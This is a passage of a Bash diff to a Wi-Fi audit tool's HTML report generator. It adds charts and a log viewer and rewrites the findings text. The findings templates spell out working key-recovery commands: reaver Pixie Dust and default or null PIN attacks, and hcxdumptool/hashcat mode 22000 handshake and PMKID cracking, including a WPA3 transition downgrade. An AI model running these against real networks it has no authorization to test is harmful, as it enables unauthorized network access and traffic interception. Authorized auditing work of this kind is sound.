+	done < <(grep -oE '"channel":"[0-9]+"' "$sar" 2>/dev/null | grep -oE '[0-9]+')
+	if ((${#cnt[@]} == 0)); then
+		printf '<div class="panel"><p class="sub">No channel data.</p></div>'
+		return 0
+	fi
+
+	local -a chans=()
+	mapfile -t chans < <(printf '%s\n' "${!cnt[@]}" | sort -n)
+
+	local max=1 c
+	for c in "${chans[@]}"; do
+		if ((cnt[$c] > max)); then max=${cnt[$c]}; fi
+	done
+
+	local n=${#chans[@]} bw=28 gap=10 padl=8 padr=12 padt=16 padb=28 chh=140
+	local plot_w=$((n * (bw + gap)))
+	if ((plot_w < 1)); then plot_w=1; fi
+	local W=$((padl + plot_w + padr)) H=$((padt + chh + padb))
+
+	local svg
+	svg=$(printf '<svg viewBox="0 0 %s %s" width="100%%" preserveAspectRatio="xMinYMid meet" role="img" aria-label="Access points per channel" style="max-width:%spx;font:11px system-ui,sans-serif">' "$W" "$H" "$W")
+	svg+=$(printf '<line x1="%s" y1="%s" x2="%s" y2="%s" stroke="currentColor" stroke-opacity="0.25"/>' "$padl" "$((padt + chh))" "$((W - padr))" "$((padt + chh))")
+
+	local i=0 x bh y col band
+	for c in "${chans[@]}"; do
+		band=$(_band_from_ch "$c" 2>/dev/null) || band="?"
+		case "$band" in
+		2.4) col="#0a0a0a" ;;
+		5) col="#595959" ;;
+		*) col="#c1121f" ;;
+		esac
+		bh=$((cnt[$c] * chh / max))
+		if ((bh < 2)); then bh=2; fi
+		x=$((padl + i * (bw + gap)))
+		y=$((padt + chh - bh))
+		svg+=$(printf '<rect x="%s" y="%s" width="%s" height="%s" rx="3" fill="%s"><title>ch %s (%s GHz): %s AP</title></rect>' "$x" "$y" "$bw" "$bh" "$col" "$c" "$band" "${cnt[$c]}")
+		svg+=$(printf '<text x="%s" y="%s" text-anchor="middle" fill="currentColor">%s</text>' "$((x + bw / 2))" "$((y - 3))" "${cnt[$c]}")
+		svg+=$(printf '<text x="%s" y="%s" text-anchor="middle" fill="currentColor" fill-opacity="0.7">%s</text>' "$((x + bw / 2))" "$((padt + chh + 14))" "$c")
+		i=$((i + 1))
+	done
+	svg+='</svg>'
+
+	printf '<div class="panel"><div style="overflow-x:auto">%s</div><div class="sub" style="margin-top:6px"><span style="color:#0a0a0a">&#9632;</span> 2.4 GHz &nbsp; <span style="color:#595959">&#9632;</span> 5 GHz &nbsp; <span style="color:#c1121f">&#9632;</span> 6 GHz</div><p class="sm sub" style="margin:6px 4px 0">Access points per channel, colored by band. Count only, not interference or load.</p></div>' "$svg"
+	return 0
+}
+
+function _sighist_row() {
+	local lab="$1" cnt="$2" max="$3" col="$4" pct
+	pct=$((cnt * 100 / max))
+	if ((pct < 2 && cnt > 0)); then pct=2; fi
+	printf '<div class="sig-row"><div class="sig-lab">%s</div><div class="sig-track"><div class="sig-fill" style="width:%s%%;background:%s"></div></div><div class="sig-val">%s</div></div>' "$lab" "$pct" "$col" "$cnt"
+	return 0
+}
+
+function _report_signal_hist() {
+	local sar="${LOG_DIR}/sar.jsonl"
+	[[ -r "$sar" ]] || return 0
+	local exc=0 good=0 fair=0 weak=0 s
+	while IFS= read -r s; do
+		[[ "$s" =~ ^-?[0-9]+$ ]] || continue
+		if ((s >= -55)); then
+			exc=$((exc + 1))
+		elif ((s >= -67)); then
+			good=$((good + 1))
+		elif ((s >= -75)); then
+			fair=$((fair + 1))
+		else
+			weak=$((weak + 1))
+		fi
+	done < <(grep -oE '"signal":"-?[0-9]+' "$sar" 2>/dev/null | grep -oE '\-?[0-9]+$')
+	local total=$((exc + good + fair + weak))
+	((total > 0)) || return 0
+	local max=$exc
+	if ((good > max)); then max=$good; fi
+	if ((fair > max)); then max=$fair; fi
+	if ((weak > max)); then max=$weak; fi
+	if ((max < 1)); then max=1; fi
+	local out='<div class="panel"><div class="sub sm" style="margin-bottom:6px">Signal distribution (count by band)</div>'
+	out+=$(_sighist_row "Excellent (&gt;= -55)" "$exc" "$max" "#0a0a0a")
+	out+=$(_sighist_row "Good (-55..-67)" "$good" "$max" "#595959")
+	out+=$(_sighist_row "Fair (-67..-75)" "$fair" "$max" "#8a8a8a")
+	out+=$(_sighist_row "Weak (&lt; -75)" "$weak" "$max" "#c1121f")
+	out+='</div>'
+	printf '%s' "$out"
+	return 0
+}
+
+function _report_signal_chart() {
+	local sar="${LOG_DIR}/sar.jsonl"
+	[[ -r "$sar" ]] || {
+		printf '<div class="panel"><p class="sub">No signal data.</p></div>'
+		return 0
+	}
+	local -a rows=()
+	local line sig essid
+	while IFS= read -r line; do
+		sig=$(printf '%s' "$line" | grep -oE '"signal":"-?[0-9]+' | grep -oE '\-?[0-9]+$') || sig=""
+		[[ "$sig" =~ ^-?[0-9]+$ ]] || continue
+		essid=$(printf '%s' "$line" | sed -nE 's/.*"essid":"([^"]*)".*/\1/p')
+		[[ -n "$essid" ]] || essid="hidden"
+		rows+=("$sig|$essid")
+	done <"$sar"
+	if ((${#rows[@]} == 0)); then
+		printf '<div class="panel"><p class="sub">No signal data.</p></div>'
+		return 0
+	fi
+
+	local -a sorted=()
+	mapfile -t sorted < <(printf '%s\n' "${rows[@]}" | sort -t'|' -k1,1nr)
+
+	local out='<div class="panel">' r s e pct col i=0
+	for r in "${sorted[@]}"; do
+		((i < 20)) || break
+		i=$((i + 1))
+		s="${r%%|*}"
+		e="${r#*|}"
+		pct=$(((s + 90) * 100 / 60))
+		if ((pct < 2)); then pct=2; fi
+		if ((pct > 100)); then pct=100; fi
+		if ((s >= -55)); then
+			col="#0a0a0a"
+		elif ((s >= -67)); then
+			col="#595959"
+		elif ((s >= -75)); then
+			col="#8a8a8a"
+		else
+			col="#c1121f"
+		fi
+		out+=$(printf '<div class="sig-row"><div class="sig-lab">%s</div><div class="sig-track"><div class="sig-fill" style="width:%s%%;background:%s"></div></div><div class="sig-val">%s dBm</div></div>' "$(_html_escape "$e")" "$pct" "$col" "$s")
+	done
+	out+='<p class="sm sub" style="margin:8px 4px 0">Signal strength (RSSI) per network, strongest first (top 20). Bars: black strongest, grey mid, red weakest. RSSI is a rough link-quality hint, not distance, speed, or coverage.</p></div>'
+	printf '%s' "$out"
+	return 0
+}
+
+function _report_view_toggle() {
+	cat <<-'VTOG'
+		<div class="viewtoggle"><button id="cp-viewbtn" type="button" aria-pressed="false">Technical view: off</button></div>
+		<script>(function(){var b=document.getElementById("cp-viewbtn");if(!b)return;b.addEventListener("click",function(){var on=document.body.classList.toggle("show-tech");b.setAttribute("aria-pressed",on);b.textContent=on?"Technical view: on":"Technical view: off";});})();</script>
+	VTOG
+}
+
+function _report_diag_logs() {
+	local ev="${LOG_EVENTS:-${LOG_DIR}/events.jsonl}"
+	if [[ ! -r "$ev" || ! -s "$ev" ]]; then
+		printf '<div class="panel"><p class="sub">No events logged.</p></div>'
+		return 0
+	fi
+	local json
+	json=$(sed 's/</\\u003c/g' "$ev" | paste -sd, -) || json=""
+	printf '<div class="panel"><div class="logbar"><select id="cp-lvl"><option value="">All levels</option><option>DEBUG</option><option>INFO</option><option>SUCCESS</option><option>WARN</option><option>ERROR</option><option>CRITICAL</option></select><input id="cp-q" type="search" placeholder="Search message or component"><button type="button" id="cp-exp">Export JSON</button><button type="button" id="cp-cpy">Copy all</button></div><div id="cp-log"></div>'
+	printf '<script type="application/json" id="cp-evt">[%s]</script>' "$json"
+	cat <<-'DIAGJS'
+		<script>(function(){
+		var E=[];try{E=JSON.parse(document.getElementById("cp-evt").textContent)||[];}catch(e){}
+		var box=document.getElementById("cp-log"),lv=document.getElementById("cp-lvl"),q=document.getElementById("cp-q");
+		function esc(s){return String(s==null?"":s).replace(/[&<>]/g,function(c){return{"&":"&amp;","<":"&lt;",">":"&gt;"}[c];});}
+		function sel(){var L=lv.value,Q=(q.value||"").toLowerCase();return E.filter(function(x){if(L&&x.level!==L)return false;if(Q){var h=((x.message||"")+" "+(x.component||"")+" "+(x.event_type||"")).toLowerCase();if(h.indexOf(Q)<0)return false;}return true;});}
+		function render(){var R=sel(),h="";if(!R.length){h='<p class="sub">No matching events.</p>';}for(var i=0;i<R.length;i++){var x=R[i];h+='<div class="logrow"><span class="lt">'+esc(x.time)+'</span> <span class="lvl '+esc(x.level)+'">'+esc(x.level)+'</span> <b>'+esc(x.component)+'</b> '+esc(x.message);if(x.technical){h+='<div class="logtech">'+esc(x.technical)+'</div>';}h+='</div>';}box.innerHTML=h;}
+		function dl(){var b=new Blob([JSON.stringify(sel(),null,2)],{type:"application/json"}),u=URL.createObjectURL(b),a=document.createElement("a");a.href=u;a.download="cp_events.json";a.click();URL.revokeObjectURL(u);}
+		function cpy(){var t=sel().map(function(x){return [x.time,x.level,x.component,x.message,x.technical].filter(Boolean).join(" | ");}).join("\n");if(navigator.clipboard){navigator.clipboard.writeText(t);}}
+		lv.onchange=render;q.oninput=render;document.getElementById("cp-exp").onclick=dl;document.getElementById("cp-cpy").onclick=cpy;render();
+		})();</script></div>
+	DIAGJS
+	return 0
+}
+
 function make_report() {
 	local stamp path_html rec b now_dot
 	local essid sig ch band ver wstate pmf akm wpa3 maker dpid enc cves f tried chip
 	local cb ce cm cp cs scope_lbl mode_lbl ev _hd
 	local -A seen_ap=() cracked=()
-	local -a fnd_sev=() fnd_ess=() fnd_bss=() fnd_title=() fnd_block=() fnd_type=()
+	local -a fnd_sev=() fnd_type=()
 	local -a as_sev=() as_name=() as_bss=() as_ch=() as_band=() as_sec=() as_res=() as_pin=()
 	local -a wps_list=() wpsk_list=() pmf_list=() nowpa3_list=() cve_list=() iso_list=()
 	local -a crit_bss=() crit_ess=() crit_meth=() crit_pin=() crit_psk=() crit_psha=() crit_proof=() crit_chip=() crit_ch=() crit_band=() crit_enc=()
-	local n_ap=0 n_wps=0 n_pmfmiss=0 n_24=0 n_5=0
+	local n_ap=0 n_wps=0 n_pmfmiss=0 n_24=0 n_5=0 n_open=0
 	local n_crit=0 n_high=0 n_med=0 n_low=0 n_info=0
 	[[ -d "${LOG_DIR:-}" ]] || return 1
 	stamp="$(date +%Y%m%d_%H%M%S)"
@@ -4614,10 +5298,20 @@ function make_report() {
 
 	# Report dedup: scope the vulnerability report to NEW confirmed networks only
 	# (BSSIDs never written to a previous report_*.html). With dedup off, behave
-	# exactly as before. If no new confirmed remain, write no file at all.
+	# exactly as before. If no new confirmed and no new posture remain, write no file.
 	local -a _creds_use=()
 	local -A _newset=()
 	local _scope_new=0 _r _cb
+	local _posture_html=""
+	build_posture_findings
+	_posture_html="$POSTURE_HTML"
+	build_corpus_findings || true
+	local _corpus_html="$CORPUS_HTML"
+	local _postcorp="${_posture_html}${_corpus_html}"
+	n_high=$(_count_sev "$_postcorp" HIGH)
+	n_med=$(_count_sev "$_postcorp" MEDIUM)
+	n_low=$(_count_sev "$_postcorp" LOW)
+	n_info=$(_count_sev "$_postcorp" INFO)
 	if [[ "${ENABLE_REPORT_DEDUP:-1}" == "1" ]]; then
 		_scope_new=1
 		for _r in "${CREDS_FOUND[@]}"; do
@@ -4627,59 +5321,42 @@ function make_report() {
 			_creds_use+=("$_r")
 			_newset["$(report_state_norm "$_cb")"]=1
 		done
-		if ((${#_creds_use[@]} == 0)); then
-			print_log INFO REPORT "skip: no new confirmed vulnerabilities"
+		if ((${#_creds_use[@]} == 0)) && [[ -z "$_posture_html" ]]; then
+			print_log INFO REPORT "skip: no new confirmed vulnerabilities or posture findings"
 			return 0
 		fi
 	else
 		_creds_use=(${CREDS_FOUND[@]+"${CREDS_FOUND[@]}"})
 	fi
 
-	local meta sev title ref repro proof pf psha ptime pchip blk pin_v psk_v
+	local proof pf psha pchip pin_v psk_v
 	for rec in ${_creds_use[@]+"${_creds_use[@]}"}; do
 		IFS='|' read -r cb ce cm cp cs <<<"$rec"
 		[[ -n "$cb" ]] || continue
 		cracked["$cb"]=1
-		meta="$(_finding_meta "$cm")"
-		IFS='|' read -r sev title ref repro <<<"$meta"
 		pf=""
 		psha=""
-		ptime=""
 		pchip=""
 		pin_v="$cp"
 		psk_v="$cs"
 		proof="$(_proof_for "$cb")" || proof=""
-		if [[ -n "$proof" ]]; then
-			local _pp _ppin _ppsk
-			IFS=$'\t' read -r pf _ppin _ppsk psha ptime pchip <<<"$proof"
-			[[ -n "$_ppin" && -z "$pin_v" ]] && pin_v="$_ppin"
-			[[ -n "$_ppsk" && ("$psk_v" == "" || "$psk_v" == "unknown") ]] && psk_v="$_ppsk"
+		if [[ -z "$proof" ]]; then
+			print_log WARN NOPROOF "proof missing"
+			continue
 		fi
+		local _pp _ppin _ppsk
+		IFS=$'\t' read -r pf _ppin _ppsk psha _ pchip <<<"$proof"
+		if [[ ! -s "$pf" ]]; then
+			print_log WARN NOPROOF "proof empty"
+			continue
+		fi
+		[[ -n "$_ppin" && -z "$pin_v" ]] && pin_v="$_ppin"
+		[[ -n "$_ppsk" && ("$psk_v" == "" || "$psk_v" == "unknown") ]] && psk_v="$_ppsk"
 		[[ -n "$ce" ]] || ce="$(_sar_field "$cb" essid)"
 		[[ -n "$ce" ]] || ce="hidden"
 		ch="$(_sar_field "$cb" channel)"
 		band="$(_band_from_ch "$ch")"
-		blk="target : ${ce} (${cb})  ch${ch:-?}/${band}G  chip=${pchip:-unknown}"
-		blk+=$'\n'"class  : ${title}"
-		blk+=$'\n'"ref    : ${ref}"
-		blk+=$'\n'"loot   :"
-		blk+=$'\n'"  wps pin    : $(_show_pin "$pin_v")"
-		blk+=$'\n'"  wpa key    : $(_show_psk "$psk_v")"
-		[[ -n "$psha" ]] && blk+=$'\n'"  key sha256 : ${psha}"
-		blk+=$'\n'"  method     : ${cm}"
-		[[ -n "$ptime" ]] && blk+=$'\n'"  got at     : ${ptime//-/.}"
-		if [[ -n "$pf" ]]; then
-			blk+=$'\n'"  proof file : ${pf##*/}  (sha256 $(_sha256_file "$pf" | sed 's/^$/unavailable/'))"
-		fi
-		blk+=$'\n'"how    : ${repro}"
-		blk+=$'\n'"hit    : key in hand. attacker joins the wlan, reads client traffic, and moves to inside hosts. full loss of secrecy for this ssid."
-		blk+=$'\n'"fix    : turn wps off; set a new psk of 20 plus random chars; move to wpa3 sae; put iot on its own vlan and ssid."
-		blk+=$'\n'"check  : offline and stable result. anyone can redo it from the proof file and the sha256."
 		fnd_sev+=("CRITICAL")
-		fnd_ess+=("$ce")
-		fnd_bss+=("$cb")
-		fnd_title+=("$title")
-		fnd_block+=("$blk")
 		fnd_type+=("crit")
 		local _ca _cenc
 		_ca="$(_sar_field "$cb" akm_list)"
@@ -4704,7 +5381,6 @@ function make_report() {
 	for rec in "${FOUND_TARGETS[@]}"; do
 		b="${rec%%|*}"
 		[[ -n "$b" ]] || continue
-		[[ "$_scope_new" == 1 && -z "${_newset[$(report_state_norm "$b")]:-}" ]] && continue
 		[[ -n "${seen_ap[$b]:-}" ]] && continue
 		seen_ap[$b]=1
 		essid="$(_sar_field "$b" essid)"
@@ -4724,9 +5400,14 @@ function make_report() {
 		[[ "$wpa3" == "YES" ]] && enc="WPA3"
 		[[ "$akm" == *SAE* && "$akm" == *PSK* ]] && enc="WPA2/3"
 		[[ "$akm" == *802.1X* ]] && enc="ENT"
+		[[ -z "$akm" ]] && enc="OPEN"
 
 		n_ap=$((n_ap + 1))
+		[[ "$enc" == "OPEN" ]] && n_open=$((n_open + 1))
 		case "$band" in 2.4) n_24=$((n_24 + 1)) ;; 5) n_5=$((n_5 + 1)) ;; esac
+		case "${wstate,,}" in configured | 1 | on | yes) n_wps=$((n_wps + 1)) ;; esac
+
+		[[ "$_scope_new" == 1 && -z "${_newset[$(report_state_norm "$b")]:-}" ]] && continue
 
 		local ap_sev="INFO" ap_result="-" ap_pindisp="-"
 		f=""
@@ -4737,7 +5418,6 @@ function make_report() {
 		fi
 		case "${wstate,,}" in
 		configured | 1 | on | yes)
-			n_wps=$((n_wps + 1))
 			[[ "$ap_result" == "-" ]] && ap_result="wps on"
 			;;
 		esac
@@ -4767,14 +5447,14 @@ function make_report() {
 		verdict="The wifi key was recovered for at least one network. Anyone in range can join those networks now."
 		status_txt="Compromised"
 		status_col="$(_sev_color CRITICAL)"
-	elif ((n_leads > 0 || n_pmfmiss > 0 || ${#iso_list[@]} > 0 || ${#nowpa3_list[@]} > 0)); then
+	elif ((n_leads > 0 || n_pmfmiss > 0 || ${#iso_list[@]} > 0 || ${#nowpa3_list[@]} > 0)) || [[ -n "$_posture_html" ]]; then
 		verdict="No key was recovered. Some networks have findings to review (WPS attacked and rejected, and/or posture)."
 		status_txt="Review"
 		status_col="$(_sev_color MEDIUM)"
 	else
 		verdict="No confirmed finding in scope and time."
 		status_txt="Clean"
-		status_col="#15803d"
+		status_col="#595959"
 	fi
 
 	local -a tl=("iw / airodump-ng (scan and recon)")
@@ -4853,8 +5533,8 @@ function make_report() {
 	local imp_wps
 	imp_wps="$(_li_esc "unauthorized wifi access" "traffic interception" "access to internal devices" "router takeover if default admin")"
 
-	local html_findings="" f_idx=0 crit_i=0 fid t
-	local item ie ib iv iver ichip ich ipmf ienc ik enc2 icv
+	local html_findings="" html_findings_tech="" f_idx=0 crit_i=0 fid t
+	local item ie ib iv ichip ich ipmf ienc ik enc2 icv
 	for i in "${order[@]}"; do
 		f_idx=$((f_idx + 1))
 		fid="$(printf 'F-%02d' "$f_idx")"
@@ -4882,25 +5562,25 @@ function make_report() {
 				ctitle="Wi-Fi key stolen with WPS Pixie Dust (${ce})"
 				cdesc="The access point has WPS on. Its chip gives a weak random value, so a tool works out the WPS PIN offline. With the PIN, the full wifi password was recovered."
 				cverify="Scan again. WPS must read off and Pixie Dust must fail. The old password must no longer work."
-				ctech=("method: pixie dust (offline); tools: reaver -K 1, pixiewps" "command: reaver -i <mon> -b ${cb} -c ${cch} -K 1" "recovered pin: ${pinS}" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: WPS external registrar PIN flaw (US-CERT VU#723755); Pixie Dust weak nonce (D. Bongard 2014)" "proof: ${cpf}")
+				ctech=("method: pixie dust (offline). tools: reaver -K 1, pixiewps" "command: reaver -i <mon> -b ${cb} -c ${cch} -K 1" "recovered pin: ${pinS}" "recovered psk: ${pskS}. psk sha256: ${cpsha}" "class: WPS external registrar PIN flaw (US-CERT VU#723755). Pixie Dust weak nonce (D. Bongard 2014)" "proof: ${cpf}")
 				;;
 			vendor)
 				ctitle="Wi-Fi key stolen with a vendor default WPS PIN (${ce})"
 				cdesc="The access point has WPS on. The vendor OUI maps to a published default PIN. The PIN was accepted and returned the full wifi password."
 				cverify="Scan again. The default PIN must be rejected and the AP must lock after a few bad tries."
-				ctech=("method: vendor default pin; tool: reaver -p <pin>" "command: reaver -i <mon> -b ${cb} -c ${cch} -p ${pinS}" "recovered pin: ${pinS}; chip ${cchip}" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: use of default credentials (CWE-1392); WPS PIN flaw (US-CERT VU#723755)" "proof: ${cpf}")
+				ctech=("method: vendor default pin. tool: reaver -p <pin>" "command: reaver -i <mon> -b ${cb} -c ${cch} -p ${pinS}" "recovered pin: ${pinS}. chip ${cchip}" "recovered psk: ${pskS}. psk sha256: ${cpsha}" "class: use of default credentials (CWE-1392). WPS PIN flaw (US-CERT VU#723755)" "proof: ${cpf}")
 				;;
 			null | empty)
 				ctitle="WPS accepts a null or empty PIN (${ce})"
 				cdesc="The access point accepts a null or empty WPS PIN with no real registrar. The full wifi password was recovered."
 				cverify="Scan again. The AP must reject a null or empty WPS PIN."
-				ctech=("method: ${cm} pin" "command: reaver -i <mon> -b ${cb} -c ${cch} -p 00000000" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: WPS PIN flaw (US-CERT VU#723755)" "proof: ${cpf}")
+				ctech=("method: ${cm} pin" "command: reaver -i <mon> -b ${cb} -c ${cch} -p 00000000" "recovered psk: ${pskS}. psk sha256: ${cpsha}" "class: WPS PIN flaw (US-CERT VU#723755)" "proof: ${cpf}")
 				;;
 			wpa_brute)
 				ctitle="WPA2 key cracked offline from handshake or PMKID (${ce})"
 				cdesc="The network uses WPA2 PSK. The 4 way handshake or PMKID was captured and cracked offline with hashcat mode 22000."
 				cverify="Set a long random password so an offline dictionary or mask crack fails, then re-test."
-				ctech=("method: wpa2 handshake / pmkid (hc22000)" "steps: hcxdumptool capture; hcxpcapngtool -o cap.22000; hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: offline dictionary crack (hashcat mode 22000)" "proof: ${cpf}")
+				ctech=("method: wpa2 handshake / pmkid (hc22000)" "steps: hcxdumptool capture. hcxpcapngtool -o cap.22000. hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}. psk sha256: ${cpsha}" "class: offline dictionary crack (hashcat mode 22000)" "proof: ${cpf}")
 				;;
 			pmkid | handshake)
 				local _src="4 way handshake"
@@ -4908,7 +5588,7 @@ function make_report() {
 				ctitle="WPA2 key cracked offline from ${_src} (${ce})"
 				cdesc="The network uses WPA2 PSK. The ${_src} was captured and then cracked offline with hashcat mode 22000, so the full wifi password is in hand."
 				cverify="Set a long random password of 20+ characters so an offline dictionary or mask crack fails, then re-test. The old password must no longer work."
-				ctech=("method: wpa2 ${_src} then offline crack (hc22000)" "steps: capture (hcxdumptool / deauth+airodump); hcxpcapngtool -o cap.22000; hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: offline dictionary crack (hashcat mode 22000); CWE-326 weak psk" "proof: ${cpf}")
+				ctech=("method: wpa2 ${_src} then offline crack (hc22000)" "steps: capture (hcxdumptool / deauth+airodump). hcxpcapngtool -o cap.22000. hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}. psk sha256: ${cpsha}" "class: offline dictionary crack (hashcat mode 22000). CWE-326 weak psk" "proof: ${cpf}")
 				;;
 			defaultkey | defaultkey-tm)
 				local _tm=""
@@ -4916,7 +5596,7 @@ function make_report() {
 				ctitle="WPA2 factory default key recovered from vendor keyspace (${ce})${_tm}"
 				cdesc="The access point kept the factory WPA2 password, which this vendor derives from the public MAC and ESSID. A small deterministic candidate set was generated from the BSSID/ESSID and checked against the captured PMKID or handshake, recovering the key in seconds."
 				cverify="Set a long random WPA2 password that is not derived from the MAC or ESSID, then re-test. The vendor default-key candidate set must no longer match."
-				ctech=("method: vendor default-key keyspace (USENIX WOOT 2015) then offline verify (hc22000)" "steps: generate candidates from bssid/essid (routerkeygen / hcxpsktool); hashcat -m 22000 cap.22000 <candidates>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: default or derivable credentials (CWE-1392, CWE-330 insufficient key randomness)" "proof: ${cpf}")
+				ctech=("method: vendor default-key keyspace (USENIX WOOT 2015) then offline verify (hc22000)" "steps: generate candidates from bssid/essid (routerkeygen / hcxpsktool). hashcat -m 22000 cap.22000 <candidates>" "recovered psk: ${pskS}. psk sha256: ${cpsha}" "class: default or derivable credentials (CWE-1392, CWE-330 insufficient key randomness)" "proof: ${cpf}")
 				;;
 			pmkid-tm | handshake-tm)
 				local _src="4 way handshake"
@@ -4924,13 +5604,13 @@ function make_report() {
 				ctitle="WPA3 transition AP: WPA2 key cracked offline from ${_src} (${ce})"
 				cdesc="The access point runs WPA3 in transition mode, so it still accepts plain WPA2 PSK. The ${_src} was captured over the WPA2 path and cracked offline with hashcat mode 22000, recovering the shared password. WPA3 SAE did not protect this because the WPA2 fallback was left on."
 				cverify="Disable WPA3 transition mode (WPA3 SAE only) or set a long random password, then re-test. The WPA2 handshake crack must fail."
-				ctech=("method: wpa3 transition downgrade -> wpa2 ${_src} -> offline crack (hc22000)" "steps: capture over wpa2 psk; hcxpcapngtool -o cap.22000; hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}; psk sha256: ${cpsha}" "class: WPA3 transition-mode downgrade (Dragonblood, Vanhoef & Ronen IEEE S&P 2020); offline dictionary crack (hashcat 22000)" "proof: ${cpf}")
+				ctech=("method: wpa3 transition downgrade -> wpa2 ${_src} -> offline crack (hc22000)" "steps: capture over wpa2 psk. hcxpcapngtool -o cap.22000. hashcat -m 22000 cap.22000 <wordlist>" "recovered psk: ${pskS}. psk sha256: ${cpsha}" "class: WPA3 transition-mode downgrade (Dragonblood, Vanhoef & Ronen IEEE S&P 2020). offline dictionary crack (hashcat 22000)" "proof: ${cpf}")
 				;;
 			*)
 				ctitle="Wi-Fi key recovered (${ce})"
 				cdesc="Key material was grabbed in this job via ${cm}. See the proof file for the numbers."
 				cverify="Redo ${cm} from the attempt log and the proof file; the AP must not give up a key."
-				ctech=("method: ${cm}" "recovered pin: ${pinS}; psk: ${pskS}; psk sha256: ${cpsha}" "proof: ${cpf}")
+				ctech=("method: ${cm}" "recovered pin: ${pinS}. psk: ${pskS}. psk sha256: ${cpsha}" "proof: ${cpf}")
 				;;
 			esac
 			local caff ctechhtml
@@ -4946,7 +5626,7 @@ function make_report() {
 			local kaff="" ktech="" p1 cn more
 			ktech="$(_li_esc "default pin(s) from the vendor db were tried with reaver; the ap rejected them (see cp_audit.log)")"
 			for item in "${wpsk_list[@]}"; do
-				IFS='|' read -r ie ib iv iver ichip ich <<<"$item"
+				IFS='|' read -r ie ib iv _ ichip ich <<<"$item"
 				local -a _kp=()
 				IFS=' ' read -r -a _kp <<<"$(_known_pins_for "$ib")"
 				p1="${_kp[0]:-?}"
@@ -4957,15 +5637,15 @@ function make_report() {
 				ktech+="$(_li_esc "reaver -i <mon> -b ${ib} -c ${ich} -p ${p1}")"
 			done
 			ktech+="$(_li_esc "class: default credentials (CWE-1392, CWE-308); WPS PIN flaw (US-CERT VU#723755)" "proof: proof_<bssid>_wps_knownpin_*.conf (candidate pin + beacon numbers)")"
-			html_findings+="$(_fcard HIGH "$fid" "WPS known default PIN tried, AP rejected it" potential "The published vendor default PIN(s) were tried with reaver and the AP rejected them. WPS is still on. Lead, not a confirmed key." High "WPS is on and the vendor PIN is a public default. The default PIN was tried and did not work, but the registrar stays exposed to other PINs or Pixie Dust." "$kaff" "If a working PIN or Pixie Dust lands, the wifi key falls in seconds." "$(_li_esc "WPS registrar stays exposed to more PIN tries" "fast path to the key if a PIN works")" "Turn WPS off. If it must stay, change the default PIN and lock the AP after a few failed tries." "Turn WPS off and scan again. WPS must read off." "$ktech")"
+			html_findings_tech+="$(_fcard HIGH "$fid" "WPS known default PIN tried, AP rejected it" potential "The published vendor default PIN(s) were tried with reaver and the AP rejected them. WPS is still on. Lead, not a confirmed key." High "WPS is on and the vendor PIN is a public default. The default PIN was tried and did not work, but the registrar stays exposed to other PINs or Pixie Dust." "$kaff" "If a working PIN or Pixie Dust lands, the wifi key falls in seconds." "$(_li_esc "WPS registrar stays exposed to more PIN tries" "fast path to the key if a PIN works")" "Turn WPS off. If it must stay, change the default PIN and lock the AP after a few failed tries." "Turn WPS off and scan again. WPS must read off." "$ktech")"
 			;;
 		wpsopen)
 			local oaff=""
 			for item in "${wps_list[@]}"; do
-				IFS='|' read -r ie ib iv iver ichip ich <<<"$item"
+				IFS='|' read -r ie ib iv _ ichip ich <<<"$item"
 				oaff+="<li>$(_html_escape "${ie} (${ib}), ch${ich}, vendor ${iv}, chip ${ichip}")</li>"
 			done
-			html_findings+="$(_fcard HIGH "$fid" "WPS registrar open, Pixie Dust / PIN tried and rejected" potential "WPS was attacked (Pixie Dust and/or default PIN) and did not return a key. The registrar is still on. Lead, not a confirmed key." High "The WPS external registrar is on. Pixie Dust and the default PIN were tried and did not work in this window, but the registrar stays exposed on weak chip families (Ralink, Realtek, Broadcom, MediaTek)." "$oaff" "An open WPS registrar is a direct path to the wifi key once a working PIN or Pixie Dust lands." "$(_li_esc "WPS registrar stays exposed to more PIN tries" "offline PIN recovery possible on weak chips")" "Turn WPS off on every network. Check it stays off after firmware updates." "Turn WPS off and scan again. WPS must read off." "$(_li_esc "tried: reaver -i <mon> -b <bssid> -c <ch> -K 1 (pixie), plus the default PIN; AP rejected" "class: WPS external registrar PIN flaw (US-CERT VU#723755)" "proof: proof_<bssid>_wps_open_*.conf")")"
+			html_findings_tech+="$(_fcard HIGH "$fid" "WPS registrar open, Pixie Dust / PIN tried and rejected" potential "WPS was attacked (Pixie Dust and/or default PIN) and did not return a key. The registrar is still on. Lead, not a confirmed key." High "The WPS external registrar is on. Pixie Dust and the default PIN were tried and did not work in this window, but the registrar stays exposed on weak chip families (Ralink, Realtek, Broadcom, MediaTek)." "$oaff" "An open WPS registrar is a direct path to the wifi key once a working PIN or Pixie Dust lands." "$(_li_esc "WPS registrar stays exposed to more PIN tries" "offline PIN recovery possible on weak chips")" "Turn WPS off on every network. Check it stays off after firmware updates." "Turn WPS off and scan again. WPS must read off." "$(_li_esc "tried: reaver -i <mon> -b <bssid> -c <ch> -K 1 (pixie), plus the default PIN; AP rejected" "class: WPS external registrar PIN flaw (US-CERT VU#723755)" "proof: proof_<bssid>_wps_open_*.conf")")"
 			;;
 		iso)
 			local isaff=""
@@ -4973,7 +5653,7 @@ function make_report() {
 				IFS='|' read -r ie ib ik <<<"$item"
 				isaff+="<li>$(_html_escape "${ie} (${ib}), key model ${ik}")</li>"
 			done
